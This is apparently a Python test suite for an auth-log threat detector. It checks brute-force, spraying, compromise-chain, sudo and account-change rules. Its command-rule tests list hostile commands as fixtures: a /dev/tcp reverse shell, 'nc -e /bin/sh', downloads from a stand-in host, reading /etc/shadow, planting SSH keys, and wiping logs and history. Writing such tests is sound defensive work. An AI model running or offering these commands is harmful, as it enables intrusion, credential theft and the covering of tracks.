import unittest
from datetime import timedelta

from helpers import BASE, accepted, failures, line, parse, sudo

from authlog_hunter.detectors import DetectionConfig, analyze, auth_attempts, match_command_rules, parse_networks
from authlog_hunter.models import Severity

ATTACKER = "192.0.2.77"


def run(lines, **cfg):
    events, stats = parse(lines)
    return analyze(events, DetectionConfig(**cfg), stats)


def rule_ids(result):
    return sorted(f.rule_id for f in result.findings)


def by_rule(result, rule_id):
    return [f for f in result.findings if f.rule_id == rule_id]


class BruteForceTests(unittest.TestCase):
    def test_threshold_boundary(self):
        self.assertEqual(by_rule(run(failures(ATTACKER, ["root"] * 9)), "AH-001"), [])
        [f] = by_rule(run(failures(ATTACKER, ["root"] * 10)), "AH-001")
        self.assertEqual(f.event_count, 10)
        self.assertEqual(f.severity, Severity.HIGH)  # root is a real account
        self.assertEqual(f.techniques, ["T1110.001"])

    def test_invalid_users_only_is_medium(self):
        [f] = by_rule(run(failures(ATTACKER, ["nosuch"] * 12, invalid=True)), "AH-001")
        self.assertEqual(f.severity, Severity.MEDIUM)

    def test_slow_attempts_outside_window_are_not_brute_force(self):
        slow = failures(ATTACKER, ["root"] * 12, step=15 * 60)  # one attempt every 15 min
        self.assertEqual(rule_ids(run(slow)), [])

    def test_repeated_message_counts_towards_threshold(self):
        lines = failures(ATTACKER, ["root"]) + [
            line(BASE, "sshd[1000]", f"message repeated 9 times: [ Failed password for root from {ATTACKER} "
                                     "port 40000 ssh2]")]
        [f] = by_rule(run(lines), "AH-001")
        self.assertEqual(f.event_count, 10)

    def test_spraying(self):
        users = ["admin", "test", "oracle", "git", "pi", "ubuntu"]
        result = run(failures(ATTACKER, users, invalid=True))
        self.assertEqual(rule_ids(result), ["AH-002"])
        self.assertEqual(by_rule(result, "AH-002")[0].techniques, ["T1110.003"])

    def test_allowlist(self):
        lines = failures("10.1.2.3", ["root"] * 20)
        self.assertEqual(rule_ids(run(lines, allowlist=parse_networks(["10.0.0.0/8"]))), [])


class AttemptCountingTests(unittest.TestCase):
    def test_invalid_user_and_failed_line_of_one_connection_count_once(self):
        events, _ = parse([
            line(BASE, "sshd[10]", f"Invalid user bob from {ATTACKER} port 1"),
            line(BASE, "sshd[10]", f"Failed password for invalid user bob from {ATTACKER} port 1 ssh2"),
            line(BASE, "sshd[10]", f"Connection closed by invalid user bob {ATTACKER} port 1 [preauth]"),
            # key-only server: no "Failed" line at all, must still count
            line(BASE, "sshd[11]", f"Invalid user eve from {ATTACKER} port 2"),
            line(BASE, "sshd[11]", f"Connection closed by invalid user eve {ATTACKER} port 2 [preauth]"),
        ])
        self.assertEqual(sorted(a.user for a in auth_attempts(events)), ["bob", "eve"])


class CompromiseTests(unittest.TestCase):
    def attack(self, n_failures=6, method="password"):
        lines = failures(ATTACKER, ["deploy"] * n_failures)
        lines.append(accepted(ATTACKER, "deploy", BASE + timedelta(minutes=5), method=method))
        return lines

    def test_success_after_failures_is_critical(self):
        result = run(self.attack())
        [f] = by_rule(result, "AH-003")
        self.assertEqual(f.severity, Severity.CRITICAL)
        self.assertEqual(f.techniques, ["T1110.001", "T1078"])
        self.assertEqual(len(result.chains), 1)
        self.assertEqual(result.chains[0].user, "deploy")

    def test_few_typos_are_not_a_compromise(self):
        self.assertEqual(by_rule(run(self.attack(n_failures=4)), "AH-003"), [])

    def test_failures_older_than_lookback_are_ignored(self):
        lines = failures(ATTACKER, ["deploy"] * 6)
        lines.append(accepted(ATTACKER, "deploy", BASE + timedelta(days=2)))
        self.assertEqual(by_rule(run(lines), "AH-003"), [])

    def test_post_compromise_activity_is_escalated_and_chained(self):
        t = BASE + timedelta(minutes=5)
        lines = self.attack() + [
            sudo("deploy", "/usr/bin/cat /etc/shadow", t + timedelta(minutes=1)),
            sudo("deploy", "/usr/sbin/useradd -m svc", t + timedelta(minutes=2)),
            line(t + timedelta(minutes=2), "useradd[900]",
                 "new user: name=svc, UID=1005, GID=1005, home=/home/svc, shell=/bin/bash"),
            line(t + timedelta(minutes=30), "passwd[901]", "pam_unix(passwd:chauthtok): password changed for other"),
            accepted("198.51.100.9", "svc", t + timedelta(hours=1), pid=6000),
        ]
        result = run(lines)
        self.assertEqual(by_rule(result, "AH-014")[0].severity, Severity.CRITICAL)  # HIGH bumped
        self.assertEqual(by_rule(result, "AH-006")[0].severity, Severity.HIGH)      # MEDIUM bumped
        self.assertEqual(len(by_rule(result, "AH-009")), 1)
        steps = {s.summary: s for s in result.chains[0].steps}
        self.assertFalse(steps["Local account 'svc' created (UID 1005)"].time_correlated)  # sudo named it
        self.assertTrue(steps["Password set for 'other'"].time_correlated)
        self.assertIn("Backdoor account 'svc' logged in from 198.51.100.9", steps)
        self.assertEqual([s.timestamp for s in result.chains[0].steps],
                         sorted(s.timestamp for s in result.chains[0].steps))


class RootAndSudoTests(unittest.TestCase):
    def test_root_login_severity_depends_on_method(self):
        [f] = by_rule(run([accepted("198.51.100.1", "root", BASE)]), "AH-004")
        self.assertEqual(f.severity, Severity.HIGH)
        [f] = by_rule(run([accepted("198.51.100.1", "root", BASE, method="publickey")]), "AH-004")
        self.assertEqual(f.severity, Severity.MEDIUM)

    def test_sudo_failures(self):
        [f] = by_rule(run([line(BASE, "sudo", "bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; "
                                              "USER=root ; COMMAND=/bin/bash")]), "AH-005")
        self.assertEqual(f.severity, Severity.MEDIUM)
        [f] = by_rule(run([line(BASE, "sudo", "bob : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/bob ; "
                                              "USER=root ; COMMAND=/bin/ls")]), "AH-005")
        self.assertEqual(f.severity, Severity.LOW)


class CommandRuleTests(unittest.TestCase):
    MALICIOUS = {
        "/usr/bin/bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1": "AH-010",
        "/usr/bin/nc -e /bin/sh 203.0.113.9 4444": "AH-010",
        "/usr/bin/curl -fsSL http://203.0.113.9/x.sh": "AH-011",
        "/usr/bin/wget http://203.0.113.9/k -O /tmp/k": "AH-011",
        "/tmp/.k.sh": "AH-012",
        "/dev/shm/x": "AH-012",
        "/usr/bin/chmod +x /tmp/.k.sh": "AH-012",
        "/usr/bin/chmod 755 /var/tmp/run": "AH-012",
        "/usr/bin/python3 /tmp/x.py": "AH-012",
        "/usr/bin/tee -a /root/.ssh/authorized_keys": "AH-013",
        "/usr/bin/cat /etc/shadow": "AH-014",
        "/usr/bin/shred -u /var/log/auth.log": "AH-015",
        "/usr/bin/journalctl --vacuum-time=1s": "AH-015",
        "/usr/bin/systemctl stop auditd": "AH-015",
        "/usr/bin/rm -f /home/deploy/.bash_history": "AH-016",
        "/usr/bin/ln -sf /dev/null /root/.bash_history": "AH-016",
        "/usr/bin/crontab /tmp/.c": "AH-017",
        "/usr/bin/cp x /etc/cron.d/update": "AH-017",
        "/usr/bin/cp evil.service /etc/systemd/system/": "AH-018",
        "/usr/bin/base64 -d payload.b64": "AH-019",
    }
    BENIGN = [
        "/usr/bin/apt update",
        "/usr/bin/systemctl restart nginx",
        "/usr/bin/tail -n 50 /var/log/nginx/error.log",
        "/usr/bin/journalctl -u nginx --since today",
        "/usr/bin/crontab -l",
        "/usr/bin/cat /home/alice/.bash_history",
        "/usr/bin/nc -zv db01 5432",
        "/usr/bin/cat /etc/passwd",
    ]

    def test_malicious_commands(self):
        for command, expected in self.MALICIOUS.items():
            with self.subTest(command=command):
                self.assertIn(expected, [r.rule_id for r in match_command_rules(command)])

    def test_benign_commands(self):
        for command in self.BENIGN:
            with self.subTest(command=command):
                self.assertEqual(match_command_rules(command), [])

    def test_download_to_tmp_is_escalated(self):
        result = run([sudo("alice", "/usr/bin/curl -o /tmp/x http://203.0.113.9/x", BASE),
                      sudo("bob", "/usr/bin/curl -O https://example.org/tool.tar.gz", BASE)])
        sev = {f.users[0]: f.severity for f in by_rule(result, "AH-011")}
        self.assertEqual(sev, {"alice": Severity.HIGH, "bob": Severity.MEDIUM})


class AccountTests(unittest.TestCase):
    def test_uid_zero_account_is_critical(self):
        [f] = by_rule(run([line(BASE, "useradd[1]", "new user: name=toor, UID=0, GID=0, home=/root, "
                                                    "shell=/bin/bash")]), "AH-006")
        self.assertEqual(f.severity, Severity.CRITICAL)

    def test_only_privileged_groups_are_flagged(self):
        result = run([line(BASE, "usermod[1]", "add 'eve' to group 'docker'"),
                      line(BASE, "usermod[2]", "add 'eve' to group 'developers'")])
        [f] = by_rule(result, "AH-007")
        self.assertIn("docker", f.description)
        self.assertEqual(f.techniques, ["T1098.007"])


class SampleLogTests(unittest.TestCase):
    """End-to-end check of the scenario in samples/auth.log."""

    def test_sample_scenario(self):
        from helpers import SAMPLE
        from authlog_hunter.parser import LogParser

        parser = LogParser(year=2026)
        result = analyze(parser.parse_paths([str(SAMPLE)]), DetectionConfig(), parser.stats)
        ids = set(rule_ids(result))
        self.assertTrue({"AH-001", "AH-002", "AH-003", "AH-004", "AH-005", "AH-006", "AH-007", "AH-009",
                         "AH-011", "AH-012", "AH-013", "AH-014", "AH-015", "AH-016", "AH-017"} <= ids)
        [compromise] = by_rule(result, "AH-003")
        self.assertEqual((compromise.src_ip, compromise.users), (ATTACKER, ["deploy"]))
        self.assertEqual(len(result.chains), 1)
        # bob's two typos from 10.10.5.30 must not be reported as a compromise
        self.assertNotIn("10.10.5.30", {f.src_ip for f in result.findings})
        self.assertEqual(result.summary["failed_attempts"], 94)


if __name__ == "__main__":
    unittest.main()
